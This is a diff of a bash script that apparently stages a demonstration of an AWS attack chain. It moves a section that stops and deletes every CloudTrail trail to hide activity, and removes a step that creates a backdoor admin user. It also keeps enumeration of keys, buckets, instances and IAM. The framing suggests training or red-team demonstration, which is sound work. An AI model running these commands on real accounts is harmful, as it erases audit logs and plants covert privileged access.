@@ -176,7 +176,7 @@ simulate_command_fake() {
 start_time=$(date +%s)
 
 
-timeout 5s termdown 600 -a -f roman
+#timeout 5s termdown 600 -a -f roman
 
 clear
 
@@ -476,8 +476,8 @@ EOF
 
 simulate_command 'aws kms list-keys' 1 1 1
 simulate_command 'aws s3api list-buckets --query "Buckets[].Name"' 1 1 1
-simulate_command 'aws ec2 describe-instances | jq'
-simulate_command 'aws ec2 describe-volumes | jq'
+simulate_command 'aws ec2 describe-instances | jq' 1 1 1
+simulate_command 'aws ec2 describe-volumes | jq' 1 1 1
 simulate_command 'aws iam list-users | jq' 1 1 1
 simulate_command 'aws iam list-policies --only-attached | jq' 1 1 1
 
@@ -529,6 +529,32 @@ simulate_command 'aws configure set aws_access_key_id "$ACCESS_KEY" && aws confi
 echo $(aws sts get-caller-identity) | jq
 
 show_message_box "NOW WE ARE ADMIN" "Let's see what else we can do."
+
+press_any_key
+clear
+
+cat << EOF
+
+==============================================================
+- Defense evasion: disable AWS CloudTrail
+==============================================================
+
+Let's use our new elevated permissions!
+For example, we can try to list cloudtrails once more:
+EOF
+
+simulate_command 'aws cloudtrail list-trails --no-paginate --region us-east-1' 1 1 1
+
+cat << EOF
+
+We can list all the available trails in the region.
+Can we disable them? This way our actions will be unnoticed!
+EOF
+
+simulate_command 'aws cloudtrail stop-logging --name $(aws cloudtrail list-trails --no-paginate --region us-east-1 | jq -r '.Trails[].Name') --region us-east-1' 1 1 1
+simulate_command 'aws cloudtrail delete-trail --name $(aws cloudtrail list-trails --no-paginate --region us-east-1 | jq -r '.Trails[].Name') --region us-east-1' 1 1 1
+
+show_message_box "DEFENSIVE EVASION" "CloudTrail logs have been disable successfully."
 
 press_any_key
 clear
@@ -599,56 +625,6 @@ clear
 cat << EOF
 
 ==============================================================
-- Persistence: Create admin account for later use 
-==============================================================
-
-EOF
-
-simulate_command "aws iam create-user --user-name non-suspicious-user" 1 1 1
-simulate_command "aws iam create-access-key --user-name non-suspicious-user" 1 1 1
-simulate_command "aws iam attach-user-policy --user-name non-suspicious-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess" 1 1 1
-
-cat << EOF
-
-Verify that user has attached policy:
-EOF
-
-simulate_command "aws iam list-attached-user-policies --user-name non-suspicious-user" 1 1 1
-
-show_message_box "ADDITIONAL CREDENTIALS" "We have created additional privileged credentials for future use."
-
-press_any_key
-clear
-
-cat << EOF
-
-==============================================================
-- Defense evasion: disable AWS CloudTrail
-==============================================================
-
-Let's use our new elevated permissions!
-For example, we can try to list cloudtrails once more:
-EOF
-
-simulate_command 'aws cloudtrail list-trails --no-paginate --region us-east-1' 1 1 1
-
-cat << EOF
-
-We can list all the available trails in the region.
-Can we disable them? This way our actions will be unnoticed!
-EOF
-
-simulate_command 'aws cloudtrail stop-logging --name $(aws cloudtrail list-trails --no-paginate --region us-east-1 | jq -r '.Trails[].Name') --region us-east-1' 1 1 1
-simulate_command 'aws cloudtrail delete-trail --name $(aws cloudtrail list-trails --no-paginate --region us-east-1 | jq -r '.Trails[].Name') --region us-east-1' 1 1 1
-
-show_message_box "DEFENSIVE EVASION" "CloudTrail logs have been disable successfully."
-
-press_any_key
-clear
-
-cat << EOF
-
-==============================================================
 - Summary
 ==============================================================
 
@@ -663,7 +639,6 @@ During this stage, we:
 - Collected customer data from cloud storage (S3 buckets)
 - Created account for later use
 - Evaded Cloud Defense by disabling logs.
-
 EOF
 
 end_time=$(date +%s)
@@ -672,8 +647,9 @@ minutes=$((duration / 60))
 seconds=$((duration % 60))
 echo "Time taken: $minutes minutes and $seconds seconds."
 
-timeout 5s termdown 5 -a -f roman -T GAMEOVER
+#timeout 5s termdown 5 -a -f roman -T GAMEOVER
 
+press_any_key
 clear
 
 cat << EOF
